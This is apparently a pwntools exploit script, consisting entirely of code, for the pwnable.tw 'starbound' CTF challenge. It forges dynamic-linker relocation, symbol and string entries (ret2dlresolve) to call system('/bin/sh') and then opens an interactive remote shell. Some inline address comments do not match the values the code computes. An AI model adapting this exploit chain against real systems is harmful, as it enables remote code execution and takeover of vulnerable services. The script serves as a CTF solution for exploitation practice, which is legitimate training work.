from pwn import *

r = remote("chall.pwnable.tw",10202)
elf = ELF('/home/len/pwnable/starbound')
rel_plt_addr = elf.get_section_by_name('.rel.plt').header.sh_addr  #0x80487c8
dynsym_addr = elf.get_section_by_name('.dynsym').header.sh_addr  #0x80481dc
dynstr_addr = elf.get_section_by_name('.dynstr').header.sh_addr  #0x80484fc
resolve_plt = 0x08048940
add_addr = 0x08048e48
ppp_ret_addr = 0x80491ba
start = 0x08057D90 + 0x10  #0x08057da0
align = 0x8 - (start - 20 - rel_plt_addr) % 0x8
start += align  #0x8057da4

fake_rel_plt_addr = start  #0x8057da4
fake_dynsym_addr = fake_rel_plt_addr + 0x8  #0x8057dac
fake_dynstr_addr = fake_dynsym_addr + 0x10  #0x8057dac
bin_sh_addr = fake_dynstr_addr + 0x7  #0x8057da3
n = fake_rel_plt_addr - rel_plt_addr  #0xf5dc
r_info = (((fake_dynsym_addr - dynsym_addr) / 0x10) << 8) + 0x7  #0xfbd07
str_offset = fake_dynstr_addr - dynstr_addr  #0xf8d0
fake_rel_plt = p32(elf.got['read']) + p32(r_info)
fake_dynsym = p32(str_offset) + p32(0) + p32(0) + p32(0)
fake_dynstr = "system\x00/bin/sh\x00\x00"

r.recvuntil('> ')
r.sendline('6')
r.recvuntil('> ')
r.sendline('2')
r.recvuntil('Enter your name: ')
r.sendline(p32(add_addr))
r.recvuntil('> ')

payload = '-33\0aaaa'
payload += p32(
    elf.plt['read']) + p32(ppp_ret_addr) + p32(0) + p32(start) + p32(150)
payload += p32(resolve_plt) + p32(n) + 'abcd' + p32(bin_sh_addr)
r.sendline(payload)
payload2 = fake_rel_plt + fake_dynsym + fake_dynstr

r.sendline(payload2)
r.interactive()